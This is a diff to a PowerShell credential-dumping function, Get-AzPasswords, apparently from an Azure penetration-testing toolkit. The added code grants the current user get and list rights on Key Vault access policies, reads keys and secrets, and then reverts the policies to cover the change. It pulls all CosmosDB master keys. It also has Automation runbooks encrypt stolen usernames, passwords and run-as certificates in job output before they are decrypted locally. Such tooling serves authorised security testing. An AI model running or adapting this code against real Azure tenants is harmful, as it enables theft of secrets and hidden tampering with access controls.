@@ -66,6 +66,11 @@ Function Get-AzPasswords
         [String]$Keys = "Y",
 
         [parameter(Mandatory=$false,
+        HelpMessage="Add list and get rights for your user in the vault access policies.")]
+        [ValidateSet("Y","N")]
+        [String]$ModifyPolicies = "N",
+
+        [parameter(Mandatory=$false,
         HelpMessage="Dump App Services Configurations.")]
         [ValidateSet("Y","N")]
         [String]$AppServices = "Y",
@@ -89,6 +94,11 @@ Function Get-AzPasswords
         HelpMessage="Password to use for exporting the Automation certificates.")]
         [String]$CertificatePassword = "TotallyNotaHardcodedPassword...",
 
+        [parameter(Mandatory=$false,
+        HelpMessage="Dump keys for CosmosDB Accounts.")]
+        [ValidateSet("Y","N")]
+        [String]$CosmosDB = "Y",
+
         [Parameter(Mandatory=$false,
         HelpMessage="Export the Key Vault certificates to local files.")]
         [ValidateSet("Y","N")]
@@ -106,7 +116,7 @@ Function Get-AzPasswords
     else{}
     
 
-    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
+    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
     if ($Subscription){        
         Select-AzSubscription -SubscriptionName $Subscription | Out-Null
     }
@@ -114,7 +124,7 @@ Function Get-AzPasswords
         # List subscriptions, pipe out to gridview selection
         $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
         $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
-        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts}
+        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB}
         break
     }
 
@@ -145,6 +155,124 @@ Function Get-AzPasswords
         foreach ($vault in $vaults){
             $vaultName = $vault.VaultName
 
+            Write-Verbose "Starting on the $vaultName Key Vault"
+
+            # Check list and read on the vault, add it if not there
+            if($ModifyPolicies -eq 'Y'){
+
+                $currentVault = Get-AzKeyVault -VaultName $vaultName
+
+                # Pulls current user ObjectID from LoginStatus
+                $currentOID = ($LoginStatus.Account.ExtendedProperties.HomeAccountId).split('.')[0]
+                                
+                # Base variable for reverting policies
+                $needsKeyRevert = $false
+                $needsSecretRevert = $false
+                $needsCleanup = $false
+
+                # If the OID is in the policies already, check if list/read available
+                if($currentVault.AccessPolicies.ObjectID -contains $currentOID){
+
+                    Write-Verbose "`tCurrent user has an existing access policy on the $vaultName vault"
+                    $userPolicy = ($currentVault.AccessPolicies | where ObjectID -Match $currentOID)
+
+                    # use the $userPolicy.PermissionsToKeys (non-str) to reset perms
+
+                    $keyPolicyStr = $userPolicy.PermissionsToKeysStr
+                    $secretPolicyStr = $userPolicy.PermissionsToSecretsStr
+                    $certPolicyStr = $userPolicy.PermissionsToCertificatesStr
+                                        
+                    #======================Keys======================
+                    # If not get, and not list try to add get and list
+                    if((!($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
+                        # Take Existing, append Get and List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"
+
+                        Write-Verbose "`t`tTrying to add Keys get/list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+                    }
+                    # If not get, and list, then try to add get
+                    elseif((!($keyPolicyStr -match "Get")) -and (($keyPolicyStr -match "List"))){
+                        # Take Existing, append Get
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
+                        
+                        Write-Verbose "`t`tTrying to add Keys get access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+
+                    }
+                    # If get, and not list, try to add list
+                    elseif((($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
+                        # Take Existing, append List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"
+
+                        Write-Verbose "`t`tTrying to add Keys list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
+                        
+                        # flag the need for clean up
+                        $needsKeyRevert = $true
+                    }
+                    else{Write-Verbose "`tCurrent user has Keys get/list access to the $vaultName vault"}
+
+                    #======================Secrets======================
+
+                    # If not get, and not list try to add get and list
+                    if((!($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
+                        # Take Existing, append Get and List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"
+
+                        Write-Verbose "`t`tTrying to add Secrets get/list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+                    }
+                    # If not get, and list, then try to add get
+                    elseif((!($secretPolicyStr -match "Get")) -and (($secretPolicyStr -match "List"))){
+                        # Take Existing, append Get
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
+                        
+                        Write-Verbose "`t`tTrying to add Secrets get access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+
+                    }
+                    # If get, and not list, try to add list
+                    elseif((($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
+                        # Take Existing, append List
+                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"
+
+                        Write-Verbose "`t`tTrying to add Secrets list access for current user"
+                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
+                        
+                        # flag the need for clean up
+                        $needsSecretRevert = $true
+                    }
+                    else{Write-Verbose "`tCurrent user has Secrets get/list access in the to the $vaultName vault"}
+                }
+                                
+                # Else, just add new rights
+                else{
+                    Write-Verbose "`tCurrent user does not have an access policy entry in the $vaultName vault, adding get/list rights"
+
+                    # Add the read rights here
+                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys get,list -PermissionsToSecrets get,list -PermissionsToCertificates get,list
+
+                    # flag the need for clean up
+                    $needsCleanup = $true
+                }
+            }
+
+
             try{
                 $keylist = Get-AzKeyVaultKey -VaultName $vaultName -ErrorAction Stop
                                 
@@ -153,15 +281,17 @@ Function Get-AzPasswords
                 foreach ($key in $keylist){
                     $keyname = $key.Name
                     Write-Verbose "`t`tGetting Key value for the $keyname Key"
-                    $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
+                    try{
+                        $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name -ErrorAction Stop
             
-                    # Add Key to the table
-                    $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
+                        # Add Key to the table
+                        $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
+                    }
+                    catch{Write-Verbose "`t`t`tUnable to access the $keyname key"}
 
                 }
             }
             catch{Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"}
-            
 
             # Dump Secrets
             try{$secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
@@ -181,16 +311,42 @@ Function Get-AzPasswords
                             $secretBytes = [convert]::FromBase64String($secretValue.SecretValueText)
                             [IO.File]::WriteAllBytes("$pwd\$secretname.pfx", $secretBytes)
                         }
-                
-                    # Add Secret to the table
-                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValue.SecretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null
 
+                    # Fix implemented from here - https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-powershell
+                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValue.SecretValue)
+                    try {
+                       $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
+                    } 
+                    finally {
+                       [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                     }
 
+                    # Add Secret to the table
+                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null
+                }
                 Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}
-
             }
 
+            # If key policies were changed, Revert them
+            if($needsKeyRevert){
+                Write-Verbose "`tReverting the Key Access Policies for the current user on the $vaultName vault"
+                # Revert the Keys, Secrets, and Certs policies
+                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
+            }
+
+            # If secrets policies were changed, Revert them
+            if($needsSecretRevert){
+                Write-Verbose "`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
+                # Revert the Secrets policy
+                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
+            }
+
+            # If Access Policy was added for your user, remove it
+            if($needsCleanup){
+                Write-Verbose "`tRemoving current user from the Access Policies for the $vaultName vault"
+                # Delete the user from the Access Policies
+                Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
+            }
         }
     }
 
@@ -267,6 +423,26 @@ Function Get-AzPasswords
         # Automation Accounts Section
         $AutoAccounts = Get-AzAutomationAccount
         Write-Verbose "Getting List of Azure Automation Accounts..."
+
+
+        # Get Cert path from 
+        $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst
+
+        if ($cert -eq $null){
+            # Create new Cert
+            New-SelfSignedCertificate -DnsName microburst -CertStoreLocation "Cert:\CurrentUser\My" -KeyUsage KeyEncipherment,DataEncipherment, KeyAgreement -Type DocumentEncryptionCert | Out-Null
+
+            # Get Cert path from 
+            $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst
+        }
+
+        # Export to cer
+        Export-Certificate -Cert $cert -FilePath .\microburst.cer | Out-Null
+
+        # Cast Cert file to B64
+        $ENCbase64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(-join($pwd,"\microburst.cer")))
+
+
         foreach ($AutoAccount in $AutoAccounts){
 
             $verboseName = $AutoAccount.AutomationAccountName
@@ -303,7 +479,17 @@ Function Get-AzPasswords
                         
                     # Cast to Base64 string in Automation, write it to output
                     "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
-                    "write-output `$base64string" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+
+                    # Copy the B64 encryption cert to the Automation Account host
+                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+
+                    # Encrypt the passwords in the Automation account output
+                    "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
+
+                    # Write the output to the log
+                    "write-output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                         
                
                 # Cast Name for runas scripts for each connection
@@ -314,8 +500,9 @@ Function Get-AzPasswords
                     "`$appId = '$autoConnectionApplicationId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
 
                     "`$SecureCertificatePassword = ConvertTo-SecureString -String $CertificatePassword -AsPlainText -Force" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
-                    "Import-PfxCertificate -FilePath .\$verboseName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
-                    "Add-AzureRMAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
+                    "Import-PfxCertificate -FilePath .\$runAsName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
+                    "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
+
                 if($jobList){
                     $jobList += @(@($jobName,$runAsName))
                 }
@@ -337,8 +524,20 @@ Function Get-AzPasswords
                     "`$myCredential = Get-AutomationPSCredential -Name '$subCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
                     "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                     "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
-                    "write-output `$userName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
-                    "write-output `$password"| Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+
+                    # Copy the B64 encryption cert to the Automation Account host
+                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+
+                    # Encrypt the passwords in the Automation account output
+                    "`$encryptedOut1 = (`$userName | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "`$encryptedOut2 = (`$password | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+
+                    # Write the output to the log
+                    "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "write-output `$encryptedOut2" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+
                     $jobList2 += @($jobName2)
                 }
             }                               
@@ -383,8 +582,10 @@ Function Get-AzPasswords
                         }
                         # Else write it to a local file
                         else{
+
                             $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
-                            [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($jobOutput.Values))
+                            # Decrypt the output and write the pfx file
+                            [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput.Values | Unprotect-CmsMessage)))
 
                             $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
                             Write-Verbose $instructionsMSG                        
@@ -433,12 +634,15 @@ Function Get-AzPasswords
                             # If there was an actual cred here, get the output and add it to the table                    
                             try{
                                 # Get the output
-                                $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
+                                $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value)
                                 
+                                # Might be able to delete this line...
                                 if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
         
-                                #write to the table
-                                $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$jobOutput[0],$jobOutput[1],"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                                # Decrypt the output and add it to the table
+                                $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
+                                $cred2 = ($jobOutput[1].value | Unprotect-CmsMessage)
+                                $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                             }
                             catch {}
 
@@ -456,7 +660,38 @@ Function Get-AzPasswords
             }
 
         }
+
+        # Remove the encryption cert from the system
+        Remove-Item .\microburst.cer
+        Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst | Remove-Item
+
     }
+    
+    if ($CosmosDB -eq 'Y'){
+        # Cosmos DB Section
+
+        Write-Verbose "Getting List of Azure CosmosDB Accounts..."
+
+        # Pipe all of the Resource Groups into Get-AzCosmosDBAccount
+        Get-AzResourceGroup | foreach-object {
+        
+            $cosmosDBaccounts = Get-AzCosmosDBAccount -ResourceGroupName $_.ResourceGroupName
+            
+            $currentRG = $_.ResourceGroupName
+
+            # Go through each account and pull the keys
+            $cosmosDBaccounts | ForEach-Object {
+                $currentDB = $_.Name
+                Write-Verbose "`tGetting the Keys for the $currentDB CosmosDB account"
+                $cDBkeys = Get-AzCosmosDBAccountKey -ResourceGroupName $currentRG -Name $_.Name
+                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryReadonlyMasterKey"),"N/A",$cDBkeys.PrimaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryReadonlyMasterKey"),"N/A",$cDBkeys.SecondaryReadonlyMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-PrimaryMasterKey"),"N/A",$cDBkeys.PrimaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
+                $TempTblCreds.Rows.Add("Azure CosmosDB Account",-join($currentDB,"-SecondaryMasterKey"),"N/A",$cDBkeys.SecondaryMasterKey,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null                
+            }
+        }
+    }
+
     Write-Verbose "Password Dumping Activities Have Completed"
 
     # Output Creds
